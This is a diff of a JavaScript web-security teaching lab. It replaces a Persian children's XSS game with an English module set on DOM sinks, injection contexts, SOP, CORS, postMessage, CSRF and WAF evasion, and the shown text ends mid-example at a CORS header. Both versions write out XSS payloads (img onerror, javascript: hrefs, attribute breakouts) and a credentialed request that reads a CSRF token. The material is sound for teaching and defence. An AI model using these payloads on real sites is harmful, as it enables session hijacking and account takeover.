@@ -1,452 +1,318 @@
-(function () {
-  const KEY = "cheragh-kid-v2";
-  const TOTAL = 9;
-  const IMG = "<img src=x onerror=\"document.querySelector('#lamp').classList.add('on')\">";
-  const IMG_MSG = "<img src=x onerror=\"parent.postMessage('LIT','*')\">";
-  const HREF = "javascript:void(document.querySelector('#lamp').classList.add('on'))";
-  function load() {
-    try { return JSON.parse(localStorage.getItem(KEY)) || { done: {}, notes: {}, voice: false }; }
-    catch (e) { return { done: {}, notes: {}, voice: false }; }
-  }
-  const state = load();
-  let current = -1;
-  const $ = (s, r) => (r || document).querySelector(s);
-  const home = $("#home");
-  const lesson = $("#lesson");
-  const welcome = $("#welcome");
-  const toast = $("#toast");
-  const dictBox = $("#dict");
-  function save() {
-    localStorage.setItem(KEY, JSON.stringify(state));
-    drawHome();
-    drawDict();
-  }
-  function say(t) {
-    toast.textContent = t;
-    toast.classList.add("show");
-    setTimeout(function () { toast.classList.remove("show"); }, 1700);
-    if (state.voice) speak(t);
-  }
-  function speak(t) {
-    if (!window.speechSynthesis) return;
-    window.speechSynthesis.cancel();
-    var u = new SpeechSynthesisUtterance(t);
-    u.lang = "fa-IR";
-    u.rate = 0.95;
-    window.speechSynthesis.speak(u);
-  }
-  const levels = [
-    { id: 0, title: "اتاق بازی", blurb: "بنویس و دکمه را بزن. صفحه جواب می‌دهد.", word: "صفحه", mean: "همان چیزی که می‌بینی و می‌تواند عوض شود." },
-    { id: 1, title: "دو جعبه", blurb: "یک نوشته در دو جعبه می‌رود. یکی حرف است، یکی دستور.", word: "دستور", mean: "حرفی که صفحه انجامش می‌دهد، نه فقط نشانش می‌دهد." },
-    { id: 2, title: "لگوهای صفحه", blurb: "یاد می‌گیری تگ یعنی برچسب دور حرف.", word: "تگ", mean: "برچسب کوچکی دور حرف؛ شبیه لگو." },
-    { id: 3, title: "لگوی جادویی", blurb: "بعضی تکه‌ها کار هم می‌کنند.", word: "رویداد", mean: "اتفاقی مثل خطا یا کلیک که یک تکه می‌تواند به آن جواب بدهد." },
-    { id: 4, title: "جیب آدرس", blurb: "ته لینک هم می‌تواند صفحه را عوض کند.", word: "ورودی", mean: "جایی که حرف تو وارد صفحه می‌شود." },
-    { id: 5, title: "دربان تنبل", blurb: "اگر یک کلمه را ممنوع کنند، راه دیگری هست.", word: "فیلتر", mean: "دربانی که بعضی کلمه‌ها را پاک می‌کند." },
-    { id: 6, title: "جای نشستن", blurb: "اگر حرف داخل لینک بنشیند، معنی‌اش عوض می‌شود.", word: "زمینه", mean: "جایی که حرف تو می‌نشیند." },
-    { id: 7, title: "دو اتاق", blurb: "یک صفحه برای صفحه دیگر نامه می‌فرستد.", word: "پیام", mean: "نامه‌ای از یک صفحه به صفحه دیگر." },
-    { id: 8, title: "دو داستان", blurb: "فرق کار به‌جای تو با خواندن دفتر تو.", word: "دربان مرورگر", mean: "قانونی که نمی‌گذارد یک سایت نامه سایت دیگر را بخواند." }
-  ];
-  function unlocked(id) {
-    if (id === 0) return true;
-    return !!(state.done[id - 1] && String(state.notes[id - 1] || "").trim());
-  }
-  function doneCount() {
-    return Object.keys(state.done).filter(function (k) { return state.done[k]; }).length;
-  }
-  function drawHome() {
-    $("#prog-text").textContent = doneCount() + " از " + TOTAL + " اتاق تمام شده";
-    $("#prog-bar").style.width = Math.round((doneCount() / TOTAL) * 100) + "%";
-    var list = $("#level-list");
-    if (!list) return;
-    list.innerHTML = "";
-    levels.forEach(function (lv) {
-      var open = unlocked(lv.id);
-      var btn = document.createElement("button");
-      btn.type = "button";
-      btn.className = "level-card" + (state.done[lv.id] ? " done" : "");
-      btn.disabled = !open;
-      btn.innerHTML = '<div class="num">' + (state.done[lv.id] ? "✓" : lv.id) + '</div><div class="meta"><h3>' + lv.title + "</h3><p>" + lv.blurb + "</p></div>" + (open ? "" : '<div class="lock">قفل</div>');
-      if (open) btn.onclick = function () { openLevel(lv.id); };
-      list.appendChild(btn);
-    });
-  }
-  function drawDict() {
-    var ul = $("#dict-list");
-    ul.innerHTML = "";
-    levels.forEach(function (lv) {
-      if (!state.done[lv.id]) return;
-      var li = document.createElement("li");
-      li.innerHTML = "<b>" + lv.word + "</b> — " + lv.mean;
-      ul.appendChild(li);
-    });
-    if (!ul.children.length) {
-      ul.innerHTML = "<li>هنوز کلمه‌ای روی دیوار نیست. اول یک اتاق را تمام کن.</li>";
-    }
-  }
-  function mark(id) {
-    if (current !== id || state.done[id]) {
-      if (state.done[id]) showWin(lesson);
-      return;
-    }
-    state.done[id] = true;
-    save();
-    showWin(lesson);
-    say("آفرین. چراغ روشن شد.");
-  }
-  function showWin(root) {
-    var ok = $(".okbox", root);
-    var why = $(".why", root);
-    var g = $(".grownup", root);
-    if (ok) ok.classList.add("show");
-    if (why) why.classList.add("show");
-    if (g) g.classList.add("show");
-  }
-  function showScreen(name) {
-    welcome.classList.remove("active");
-    home.classList.remove("active");
-    lesson.classList.remove("active");
-    if (name === "welcome") welcome.classList.add("active");
-    if (name === "home") home.classList.add("active");
-    if (name === "lesson") lesson.classList.add("active");
-  }
-  function openLevel(id) {
-    current = id;
-    showScreen("lesson");
-    lesson.innerHTML = "";
-    var wrap = document.createElement("div");
-    lesson.appendChild(wrap);
-    wrap.innerHTML = '<div class="nav-row"><button class="ghost" id="back" type="button">برگشت به خانه‌ها</button><button class="ghost" id="read-lesson" type="button">برایم بخوان</button></div>';
-    $("#back", wrap).onclick = function () {
-      current = -1;
-      showScreen("home");
-      drawHome();
-    };
-    [r0, r1, r2, r3, r4, r5, r6, r7, r8][id](wrap);
-    addNotes(wrap, id);
-    $("#read-lesson", wrap).onclick = function () {
-      var g = $(".goal", wrap);
-      speak((g && g.textContent) || levels[id].blurb);
-    };
-    window.scrollTo(0, 0);
-  }
-  function shell(wrap, data) {
-    wrap.insertAdjacentHTML("beforeend",
-      "<h2>" + data.title + "</h2>" +
-      '<div class="steps">' +
-      '<span class="step-pill">۱ داستان</span>' +
-      '<span class="step-pill now">۲ خودت بزن</span>' +
-      '<span class="step-pill">۳ اسم بزرگسال</span>' +
-      '<span class="step-pill">۴ دفترچه</span></div>' +
-      '<div class="goal"><b>کار این اتاق: </b>' + data.goal + "</div>" +
-      (data.demo ? '<div class="row"><button class="tiny" id="demo" type="button">ببین چطور</button></div>' : "") +
-      '<div class="lab-box" id="arena"></div>' +
-      '<div class="hints"><div class="row">' +
-      '<button class="tiny" data-h="1" type="button">یک هل کوچک</button>' +
-      '<button class="tiny" data-h="2" type="button">یک مثال</button>' +
-      '<button class="tiny" data-h="3" type="button">دست معلم</button></div>' +
-      '<div class="hint-layer" id="h1">' + data.h1 + "</div>" +
-      '<div class="hint-layer" id="h2">' + data.h2 + "</div>" +
-      '<div class="hint-layer" id="h3">' + data.h3 + "</div></div>" +
-      '<div class="okbox">پیدا کردی. چراغ روشن شد.</div>' +
-      '<div class="why">' + data.why + "</div>" +
-      '<div class="grownup"><b>اسم بزرگسال: </b>' + data.grown + "</div>"
-    );
-    wrap.querySelectorAll("[data-h]").forEach(function (b) {
-      b.onclick = function () { $("#h" + b.getAttribute("data-h"), wrap).classList.toggle("show"); };
-    });
-    if (state.done[data.id]) showWin(wrap);
-    return $("#arena", wrap);
-  }
-  function addNotes(wrap, id) {
-    var box = document.createElement("div");
-    box.className = "lab-box";
-    box.innerHTML = "<h3>دفترچه</h3><label>با زبان خودت بگو دیدی چه شد. تا ننویسی، اتاق بعد باز نمی‌شود.</label><textarea id=\"note\" placeholder=\"مثلاً: جعبه زرد نوشته را دستور دید...\"></textarea><div class=\"row\"><button id=\"save-note\" type=\"button\">ذخیره جمله</button></div>";
-    wrap.appendChild(box);
-    $("#note", box).value = state.notes[id] || "";
-    $("#save-note", box).onclick = function () {
-      var t = $("#note", box).value.trim();
-      if (!t) { say("یک جمله بنویس"); return; }
-      if (!state.done[id]) { say("اول کار اتاق را تمام کن"); return; }
-      state.notes[id] = t;
-      save();
-      say("ذخیره شد. اتاق بعد باز است.");
-    };
-  }
-  function watchLamp(lamp, id) {
-    new MutationObserver(function () {
-      if (lamp.classList.contains("on")) mark(id);
-    }).observe(lamp, { attributes: true });
-  }
-  function bindDemo(wrap, fn) {
-    var b = $("#demo", wrap);
-    if (b) b.onclick = fn;
-  }
-  function r0(wrap) {
-    var arena = shell(wrap, {
-      id: 0, title: "اتاق بازی",
-      goal: "اسمت را بنویس و دکمه را بزن. باید سلام ببینی و چراغ روشن شود.",
-      demo: true,
-      h1: "اول داخل کادر یک اسم بنویس، بعد دکمه را بزن.",
-      h2: "مثلاً بنویس: مبینا",
-      h3: "هر اسمی کافی است. مهم این است که سلام بیاید.",
-      why: "صفحه مثل یک اتاق است. تو حرف می‌زنی، اتاق جواب می‌دهد. برنامه‌نویسی همین است.",
-      grown: "به این می‌گویند صفحه وب. هنوز هیچ کلمه سختی لازم نیست."
-    });
-    arena.innerHTML = "<h3>دیوار اتاق</h3><div class=\"lamp\" id=\"lamp\"></div><label>اسم تو</label><input id=\"name\" type=\"text\" placeholder=\"اینجا بنویس\" /><div class=\"row\"><button class=\"primary\" id=\"go\" type=\"button\">سلام کن</button></div><div class=\"pane\"><b>جواب اتاق</b><div class=\"sink\" id=\"out\">هنوز چیزی نگفته‌ای</div></div>";
-    function run(n) {
-      if (!n) { say("یک اسم بنویس"); return; }
-      $("#out", arena).textContent = "سلام " + n + "، خوش آمدی.";
-      $("#lamp", arena).classList.add("on");
-      mark(0);
-    }
-    $("#go", arena).onclick = function () { run($("#name", arena).value.trim()); };
-    bindDemo(wrap, function () {
-      $("#name", arena).value = "دوست من";
-      run("دوست من");
-    });
-  }
-  function r1(wrap) {
-    var arena = shell(wrap, {
-      id: 1, title: "دو جعبه",
-      goal: "چیزی بنویس که در یک جعبه فقط نوشته باشد و در جعبه دیگر درشت دیده شود.",
-      demo: true,
-      h1: "باید دور حرف یک علامت مخصوص بگذاری.",
-      h2: "این را عیناً بنویس: <b>سلام</b>",
-      h3: "همان <b>سلام</b> را بگذار و دکمه را بزن.",
-      why: "یک جعبه حرف را همان‌طور که هست نشان می‌دهد. جعبه دیگر همان حرف را دستور می‌بیند.",
-      grown: "جعبه حرف یعنی textContent. جعبه دستور یعنی innerHTML."
-    });
-    arena.innerHTML = "<label>این را در هر دو جعبه بریز</label><input id=\"inp\" type=\"text\" /><div class=\"row\"><button class=\"primary\" id=\"go\" type=\"button\">بریز داخل جعبه‌ها</button></div><div class=\"compare\"><div class=\"pane\"><b>جعبه حرف</b><div class=\"sink\" id=\"safe\"></div></div><div class=\"pane\"><b>جعبه دستور</b><div class=\"sink\" id=\"unsafe\"></div></div></div>";
-    function run(v) {
-      $("#safe", arena).textContent = v;
-      $("#unsafe", arena).innerHTML = v;
-      if ($("#unsafe", arena).querySelector("b,strong,i,em,u")) mark(1);
-    }
-    $("#go", arena).onclick = function () { run($("#inp", arena).value); };
-    bindDemo(wrap, function () {
-      $("#inp", arena).value = "<b>سلام</b>";
-      run("<b>سلام</b>");
-    });
-  }
-  function r2(wrap) {
-    var arena = shell(wrap, {
-      id: 2, title: "لگوهای صفحه",
-      goal: "سه سؤال را درست جواب بده.",
-      demo: false,
-      h1: "تگ یعنی یک برچسب دور حرف.",
-      h2: "<b> یعنی درشت.",
-      h3: "جواب‌ها: برچسب دور حرف / درشت می‌شود / دستور است",
-      why: "صفحه از تکه‌های کوچک ساخته شده. به این تکه‌ها می‌گویند تگ.",
-      grown: "تگ همان HTML tag است. مثل <b> یا <img>."
-    });
-    var qs = [
-      { q: "تگ یعنی چه؟", opts: ["یک رنگ", "یک برچسب دور حرف", "اسم سایت"], a: 1 },
-      { q: "اگر بنویسی <b>گل</b> چه می‌شود؟", opts: ["گل درشت دیده می‌شود", "سایت خاموش می‌شود", "هیچ"], a: 0 },
-      { q: "جعبه دستور، تگ را چه می‌بیند؟", opts: ["نقاشی", "دستور", "رمز عبور"], a: 1 }
-    ];
-    var html = '<div class="arena-quiz">';
-    qs.forEach(function (item, i) {
-      html += "<p><b>" + (i + 1) + ". </b>" + item.q + "</p>";
-      item.opts.forEach(function (o, j) {
-        html += '<button type="button" data-q="' + i + '" data-i="' + j + '">' + o + "</button>";
-      });
-    });
-    html += "<p id='score'></p></div>";
-    arena.innerHTML = html;
-    var picked = {};
-    arena.querySelectorAll("button[data-q]").forEach(function (b) {
-      b.onclick = function () {
-        var q = +b.getAttribute("data-q");
-        var i = +b.getAttribute("data-i");
-        picked[q] = i;
-        arena.querySelectorAll('button[data-q="' + q + '"]').forEach(function (x) { x.style.borderColor = "#ead9b6"; });
-        b.style.borderColor = "#f0b429";
-        if (Object.keys(picked).length === 3) {
-          var ok = qs.every(function (item, idx) { return picked[idx] === item.a; });
-          $("#score", arena).textContent = ok ? "هر سه درست بود." : "یکی را دوباره فکر کن.";
-          if (ok) mark(2);
-        }
-      };
-    });
-  }
-  function r3(wrap) {
-    var arena = shell(wrap, {
-      id: 3, title: "لگوی جادویی",
-      goal: "یک تصویر خراب بساز که وقتی پیدا نشد، چراغ را روشن کند.",
-      demo: true,
-      h1: "تصویری بساز که وجود ندارد.",
-      h2: "بعضی تصویرها وقتی خراب می‌شوند یک کار اضافه می‌کنند.",
-      h3: IMG,
-      why: "بعضی تکه‌ها منتظر یک اتفاق‌اند. وقتی اتفاق افتاد، کار دیگری هم انجام می‌شود.",
-      grown: "این رویداد onerror روی تگ img است. به این می‌گویند event handler."
-    });
-    arena.innerHTML = "<div class=\"lamp\" id=\"lamp\"></div><label>اینجا یک تکه لگو بگذار</label><input id=\"inp\" type=\"text\" /><div class=\"row\"><button class=\"primary\" id=\"go\" type=\"button\">بگذار روی میز</button></div><div class=\"sink\" id=\"out\"></div>";
-    watchLamp($("#lamp", arena), 3);
-    $("#go", arena).onclick = function () { $("#out", arena).innerHTML = $("#inp", arena).value; };
-    bindDemo(wrap, function () {
-      $("#inp", arena).value = IMG;
-      $("#out", arena).innerHTML = IMG;
-    });
-  }
-  function r4(wrap) {
-    var arena = shell(wrap, {
-      id: 4, title: "جیب آدرس",
-      goal: "چیزی در کادر آدرس بگذار که چراغ روشن شود.",
-      demo: true,
-      h1: "کادر آدرس هم یک ورودی است.",
-      h2: "همان لگوی تصویر خراب اتاق قبل را اینجا هم می‌شود گذاشت.",
-      h3: IMG,
-      why: "ته لینک هم ورودی است. صفحه آن را برمی‌دارد و روی میز می‌گذارد.",
-      grown: "این ورودی را source می‌گویند. گذاشتنش روی میز sink است. مثل location.hash + innerHTML."
-    });
-    arena.innerHTML = "<div class=\"lamp\" id=\"lamp\"></div><label>ته لینک فرضی</label><input id=\"inp\" type=\"text\" /><div class=\"row\"><button class=\"primary\" id=\"go\" type=\"button\">بگذار ته لینک</button></div><div class=\"pane\"><b>صفحه چه دید</b><div class=\"sink\" id=\"out\">سلام مهمان</div></div>";
-    watchLamp($("#lamp", arena), 4);
-    $("#go", arena).onclick = function () { $("#out", arena).innerHTML = "سلام " + $("#inp", arena).value; };
-    bindDemo(wrap, function () {
-      $("#inp", arena).value = IMG;
-      $("#out", arena).innerHTML = "سلام " + IMG;
-    });
-  }
-  function r5(wrap) {
-    var arena = shell(wrap, {
-      id: 5, title: "دربان تنبل",
-      goal: "اتاق کلمه script را پاک می‌کند. بدون آن کلمه چراغ را روشن کن.",
-      demo: true,
-      h1: "اگر یک در بسته باشد، از پنجره برو.",
-      h2: "از تصویر خراب استفاده کن، نه از کلمه سانسورشده.",
-      h3: IMG,
-      why: "سانسور یک کلمه جلوی همه کارها را نمی‌گیرد.",
-      grown: "این یک فیلتر ضعیف است. WAF ضعیف همین کار را می‌کند."
-    });
-    arena.innerHTML = "<div class=\"lamp\" id=\"lamp\"></div><input id=\"inp\" type=\"text\" /><div class=\"row\"><button class=\"primary\" id=\"go\" type=\"button\">بفرست</button></div><div class=\"sink\" id=\"out\"></div>";
-    watchLamp($("#lamp", arena), 5);
-    $("#go", arena).onclick = function () {
-      $("#out", arena).innerHTML = $("#inp", arena).value.replace(/script/gi, "");
-    };
-    bindDemo(wrap, function () {
-      $("#inp", arena).value = IMG;
-      $("#out", arena).innerHTML = IMG;
-    });
-  }
-  function r6(wrap) {
-    var arena = shell(wrap, {
-      id: 6, title: "جای نشستن",
-      goal: "یک لینک بساز. وقتی روی لینک کلیک شد، چراغ روشن شود.",
-      demo: true,
-      h1: "این بار حرف تو داخل خود لینک می‌نشیند.",
-      h2: "به‌جای آدرس سایت یک دستور کوچک بگذار.",
-      h3: HREF,
-      why: "جای نشستن حرف، معنی‌اش را عوض می‌کند.",
-      grown: "این می‌شود javascript: داخل href. زمینه فرق دارد."
-    });
-    arena.innerHTML = "<div class=\"lamp\" id=\"lamp\"></div><label>داخل لینک چه نوشته شود؟</label><input id=\"inp\" type=\"text\" value=\"https://example.com\" /><div class=\"row\"><button class=\"primary\" id=\"go\" type=\"button\">لینک را بساز</button></div><div id=\"out\"></div>";
-    watchLamp($("#lamp", arena), 6);
-    $("#go", arena).onclick = function () {
-      $("#out", arena).innerHTML = '<a href="' + $("#inp", arena).value + '">روی من کلیک کن</a>';
-    };
-    bindDemo(wrap, function () {
-      $("#inp", arena).value = HREF;
-      $("#out", arena).innerHTML = '<a href="' + HREF + '">روی من کلیک کن</a>';
-    });
-  }
-  function r7(wrap) {
-    var arena = shell(wrap, {
-      id: 7, title: "دو اتاق",
-      goal: "به اتاق بغلی پیامی بفرست که چراغ این‌جا روشن شود.",
-      demo: true,
-      h1: "اتاق بغلی هر نامه را روی میز می‌گذارد.",
-      h2: "نامه را مثل لگوی تصویر خراب بفرست و از او بخواه به تو خبر بدهد.",
-      h3: IMG_MSG,
-      why: "اگر گیرنده نامه را بدون نگاه کردن روی میز بگذارد، نامه می‌تواند دستور شود.",
-      grown: "این postMessage بدون چک کردن origin است."
-    });
-    arena.innerHTML = "<div class=\"lamp\" id=\"lamp\"></div><iframe class=\"lab\" id=\"child\" src=\"child.html\"></iframe><label>نامه برای اتاق بغلی</label><input id=\"msg\" type=\"text\" /><div class=\"row\"><button class=\"primary\" id=\"send\" type=\"button\">بفرست</button></div>";
-    window.addEventListener("message", function (e) {
-      if (current !== 7) return;
-      if (e.data === "LIT") {
-        $("#lamp", arena).classList.add("on");
-        mark(7);
-      }
-    });
-    $("#send", arena).onclick = function () {
-      $("#child", arena).contentWindow.postMessage($("#msg", arena).value, "*");
-    };
-    bindDemo(wrap, function () {
-      $("#msg", arena).value = IMG_MSG;
-      $("#child", arena).contentWindow.postMessage(IMG_MSG, "*");
-    });
-  }
-  function r8(wrap) {
-    var arena = shell(wrap, {
-      id: 8, title: "دو داستان",
-      goal: "برای هر داستان بگو کدام یکی است.",
-      demo: false,
-      h1: "یکی کار به‌جای تو است. یکی نخواندن جواب است.",
-      h2: "داستان ۱ کار به‌جای تو. داستان ۲ دربان. داستان ۳ همان خانه.",
-      h3: "۱) کار به‌جای تو  ۲) دربان جلوی خواندن  ۳) همان خانه؛ مانع نیست",
-      why: "گاهی لازم نیست جواب را بخوانند؛ کافی است به جای تو کاری انجام شود. گاهی هم می‌خواهند بخوانند و مرورگر راه را می‌بندد.",
-      grown: "داستان ۱ نزدیک CSRF است. داستان ۲ همان SOP است. داستان ۳ همان صفحه خودت است."
-    });
-    var items = [
-      { t: "کسی بدون اینکه ببینی، از خانه تو برای بانک دکمه بفرست را می‌زند.", o: ["کار به‌جای تو", "خواندن دفتر تو"], a: 0 },
-      { t: "از خانه بغلی می‌خواهند دفتر حساب تو را بخوانند. نامه می‌رود ولی جواب را نشانشان نمی‌دهند.", o: ["دربان جلوی خواندن را گرفت", "دکمه خراب بود"], a: 0 },
-      { t: "داخل همان صفحه خودت هستی و دفتر همان صفحه را می‌خوانی.", o: ["دربان مانع است", "همان خانه است؛ مانع نیست"], a: 1 }
-    ];
-    var html = "";
-    items.forEach(function (it, i) {
-      html += '<div class="story"><b>داستان ' + (i + 1) + "</b><p>" + it.t + "</p>";
-      it.o.forEach(function (opt, j) {
-        html += '<button type="button" data-q="' + i + '" data-i="' + j + '">' + opt + "</button>";
-      });
-      html += "</div>";
-    });
-    html += "<p id='score'></p>";
-    arena.innerHTML = html;
-    var picked = {};
-    arena.querySelectorAll("button[data-q]").forEach(function (b) {
-      b.onclick = function () {
-        var q = +b.getAttribute("data-q");
-        var i = +b.getAttribute("data-i");
-        picked[q] = i;
-        arena.querySelectorAll('button[data-q="' + q + '"]').forEach(function (x) { x.style.borderColor = "#ead9b6"; });
-        b.style.borderColor = "#f0b429";
-        if (Object.keys(picked).length === 3) {
-          var ok = items.every(function (it, idx) { return picked[idx] === it.a; });
-          $("#score", arena).textContent = ok ? "داستان‌ها را درست جدا کردی." : "یکی را دوباره بخوان.";
-          if (ok) mark(8);
-        }
-      };
-    });
-  }
-  $("#start-home").onclick = function () { showScreen("home"); drawHome(); };
-  $("#back-welcome").onclick = function () { showScreen("welcome"); };
-  $("#read-welcome").onclick = function () {
-    speak("سلام. من چراغک هستم. اینجا یک خانه است. هر اتاق یک کار خیلی کوچک دارد. اول ببین، بعد خودت بزن، بعد بنویس.");
+const KEY = "js-lab-v4";
+const $ = (s, r=document) => r.querySelector(s);
+const toast = (m) => { const t=$("#toast"); t.textContent=m; t.classList.add("show"); setTimeout(()=>t.classList.remove("show"), 2400); };
+
+const mods = [
+  { id:"m1", title:"DOM / BOM · Source & Sink", topic:"Foundation",
+    blurb:"window ⊃ document ⊃ Node. taint from attacker Source to executing Sink." },
+  { id:"m2", title:"Injection Contexts", topic:"XSS",
+    blurb:"HTML body, quoted attribute, URL sink, JS string — each needs its own payload." },
+  { id:"m3", title:"HTML sinks: innerHTML / insertAdjacentHTML", topic:"DOM XSS",
+    blurb:"parser-inserted script vs event-handler gadget (onerror/onload)." },
+  { id:"m4", title:"XHR / Fetch · responseType & credentials", topic:"AJAX",
+    blurb:"readyState, responseType=document, credentials:include." },
+  { id:"m5", title:"Same-Origin Policy", topic:"SOP",
+    blurb:"tuple (scheme, host, port). SOP blocks read, not send." },
+  { id:"m6", title:"CORS misconfiguration", topic:"CORS",
+    blurb:"reflected ACAO + ACAC, wildcard vs credentials, null origin, preflight." },
+  { id:"m7", title:"window.postMessage", topic:"Cross-window",
+    blurb:"targetOrigin='*' and listener without event.origin check." },
+  { id:"m8", title:"CSRF · Cookie · SameSite", topic:"CSRF",
+    blurb:"simple request, Lax GET, token steal via same-origin XSS." },
+  { id:"m9", title:"XSS taxonomy", topic:"XSS",
+    blurb:"Reflected / Stored / DOM / Blind / Self. View-Source vs runtime DOM." },
+  { id:"m10", title:"Prototype Pollution · WAF evasion", topic:"Advanced",
+    blurb:"__proto__ gadget, fromCharCode, bracket notation, NFKD vs filter order." },
+];
+
+function load(){ try { return JSON.parse(localStorage.getItem(KEY)||"{}"); } catch { return {}; } }
+function save(s){ localStorage.setItem(KEY, JSON.stringify(s)); }
+function done(id){ const s=load(); s[id]=true; save(s); renderHome(); }
+
+function renderHome(){
+  const s=load();
+  const n=mods.filter(m=>s[m.id]).length;
+  $("#prog-text").textContent = n+" / "+mods.length;
+  $("#prog-bar").style.width = (n/mods.length*100)+"%";
+  $("#mod-list").innerHTML = mods.map(m => `
+    <button class="card ${s[m.id]?"done":""}" data-id="${m.id}">
+      <b>${m.title}</b>
+      <span>${m.blurb}</span>
+      <i class="tag">${m.topic}${s[m.id]?" · done":""}</i>
+    </button>`).join("");
+  $("#mod-list").onclick = (e) => {
+    const b=e.target.closest("[data-id]"); if(b) openMod(b.dataset.id);
   };
-  $("#btn-words").onclick = function () {
-    drawDict();
-    dictBox.hidden = !dictBox.hidden;
-  };
-  $("#close-dict").onclick = function () { dictBox.hidden = true; };
-  $("#btn-voice").onclick = function () {
-    state.voice = !state.voice;
-    save();
-    $("#btn-voice").textContent = state.voice ? "صدا خاموش" : "صدا روشن";
-    say(state.voice ? "صدا روشن شد" : "صدا خاموش شد");
-  };
-  $("#btn-voice").textContent = state.voice ? "صدا خاموش" : "صدا روشن";
-  $("#reset").onclick = function () {
-    if (confirm("از اتاق اول شروع کنیم؟")) {
-      localStorage.removeItem(KEY);
-      state.done = {};
-      state.notes = {};
-      state.voice = false;
-      $("#btn-voice").textContent = "صدا روشن";
-      drawHome();
-      drawDict();
-      say("از صفر");
-    }
-  };
-  drawHome();
-  drawDict();
-})();
+}
+function openHome(){
+  $("#lesson").classList.remove("active");
+  $("#home").classList.add("active");
+  renderHome();
+}
+function wrap(title, html){
+  $("#home").classList.remove("active");
+  const el=$("#lesson");
+  el.classList.add("active");
+  el.innerHTML = `<div class="lesson"><div class="crumbs"><button type="button" id="back">← modules</button></div><h2>${title}</h2>${html}</div>`;
+  $("#back").onclick = openHome;
+}
+function markBtn(id){
+  return `<div class="row"><button class="primary" id="mark" type="button">mark module done</button></div>`;
+}
+function afterMark(id){
+  const b=$("#mark"); if(b) b.onclick=()=>{ done(id); toast("saved"); openHome(); };
+}
+function openMod(id){
+  const m=mods.find(x=>x.id===id);
+  wrap(m.title, builders[id]());
+  if(hooks[id]) hooks[id]();
+  afterMark(id);
+}
+
+const builders = {
+  m1(){ return `<div class="block"><h3>Browser object model</h3>
+<p><b>BOM</b> = Browser Object Model: <code>window</code>, <code>location</code>, <code>history</code>, <code>navigator</code>.</p>
+<p><b>DOM</b> = Document Object Model. Prototype chain: <code>HTMLElement → Element → Node → EventTarget → Object</code>.</p>
+<pre>window === this
+document === window.document
+location === window.location === document.location</pre></div>
+<div class="block"><h3>Source → Sink (taint flow)</h3>
+<p>Client-side bug = attacker-controlled Source reaches an executing Sink without sanitization.</p>
+<pre>// Sources
+location.href / hash / search / pathname
+document.URL / documentURI / referrer / cookie
+history.state / window.name / event.data
+xhr.responseText / fetch().text() / URLSearchParams
+
+// Sinks
+innerHTML / outerHTML / insertAdjacentHTML / document.write
+eval / Function / setTimeout(string)
+location.href / assign / replace
+element.src / href / setAttribute("onerror")
+postMessage(data, "*")</pre></div>
+<div class="lab"><label>simulated Source (like location.hash.slice(1))</label>
+<input id="src" type="text" value="<img src=x onerror=console.log('sink-fired')>" />
+<div class="row">
+<button id="to-text" type="button">textContent</button>
+<button id="to-html" type="button">innerHTML</button>
+<button id="to-adj" type="button">insertAdjacentHTML</button>
+<button id="to-loc" type="button">location.hash = value</button>
+</div>
+<div class="out" id="sink-out">sink empty</div>
+<pre id="m1-note"></pre></div>${markBtn("m1")}`; },
+  m2(){ return `<div class="block"><h3>Context decides the payload</h3>
+<pre><div>USER</div>
+payload: <img src=x onerror=alert(1)>
+
+<input value="USER">
+payload: " autofocus onfocus=alert(1) x="
+
+<a href="USER">
+payload: javascript:alert(document.domain)
+
+<script>var q = "USER";</script>
+payload: ";alert(1);//</pre></div>
+<div class="lab"><label>context + payload</label>
+<select id="ctx">
+<option value="href">URL sink — a.href</option>
+<option value="attr">quoted attr — input.value</option>
+<option value="html">HTML body — innerHTML</option>
+<option value="js">JS string</option>
+</select>
+<input id="pay" type="text" value="javascript:alert(1)" style="margin-top:8px" />
+<div class="row"><button id="render-ctx" class="primary" type="button">render into sink</button></div>
+<div class="out" id="ctx-out"></div>
+<pre id="ctx-code"></pre></div>${markBtn("m2")}`; },
+  m3(){ return `<div class="block"><h3>HTML parser on assignment</h3>
+<p><code>innerHTML</code> parses the string. Parser-inserted <code><script></code> does not run. Gadgets that do: <code>img onerror</code>, <code>svg onload</code>, <code>iframe src=javascript:</code>, <code>details ontoggle</code>.</p>
+<p>Safe text: <code>textContent</code>. Controlled HTML: DOMPurify / Trusted Types.</p>
+<pre>el.innerHTML = location.hash.slice(1);
+el.insertAdjacentHTML("beforeend", source);
+el.outerHTML = source;</pre></div>
+<div class="lab"><label>payload</label>
+<input id="p3" type="text" value='<img src=x onerror="this.outerHTML='[onerror executed]'">' />
+<div class="row">
+<button id="html3" class="primary" type="button">innerHTML</button>
+<button id="text3" type="button">textContent</button>
+<button id="adj3" type="button">insertAdjacentHTML</button>
+</div>
+<div class="out" id="o3"></div></div>${markBtn("m3")}`; },
+  m4(){ return `<div class="block"><h3>XMLHttpRequest state machine</h3>
+<pre>UNSENT 0 → OPENED 1 → HEADERS_RECEIVED 2 → LOADING 3 → DONE 4
+
+const xhr = new XMLHttpRequest();
+xhr.responseType = "document";
+xhr.withCredentials = true;
+xhr.onload = () => xhr.response.querySelector("[name=csrf]").value;
+xhr.open("GET", "/my-account");
+xhr.send();
+
+await fetch("/my-account", { credentials: "include" });</pre>
+<p>Cross-origin read without CORS throws TypeError. The request may still have been sent.</p></div>
+<div class="lab"><p>same-origin fetch("child.html") + DOMParser</p>
+<div class="row">
+<button id="fetch4" class="primary" type="button">fetch + DOMParser</button>
+<button id="xhr4" type="button">XHR</button>
+</div>
+<pre id="o4">// output</pre></div>${markBtn("m4")}`; },
+  m5(){ return `<div class="block"><h3>Origin tuple</h3>
+<p>Origin = scheme://host:port. Path and query are not part of origin.</p>
+<pre>https://a.com vs http://a.com          different scheme
+https://a.com vs https://a.com:8443    different port
+https://a.com vs https://api.a.com     different host
+https://a.com/x vs https://a.com/y     SAME origin</pre>
+<p>SOP blocks <b>reading</b> a cross-origin response. Sending is usually allowed — that is why CSRF exists. XSS runs inside the victim origin, so SOP does not apply.</p>
+<p><b>XSSI:</b> <script src=cross-origin> is exempt from SOP. If the response is JS that assigns a secret to a global, the attacker page reads it.</p></div>
+<div class="lab"><pre id="orig"></pre>
+<div class="quiz">
+<label><input type="radio" name="q5" value="0"> SOP blocks CSRF form submit</label>
+<label><input type="radio" name="q5" value="1"> SOP blocks JS from reading another origin's JSON</label>
+<label><input type="radio" name="q5" value="2"> Different paths are always cross-origin</label>
+</div>
+<button id="chk5" type="button">check</button>
+<div class="out" id="o5"></div></div>${markBtn("m5")}`; },
+  m6(){ return `<div class="block"><h3>CORS headers</h3>
+<pre>Origin: https://evil.example
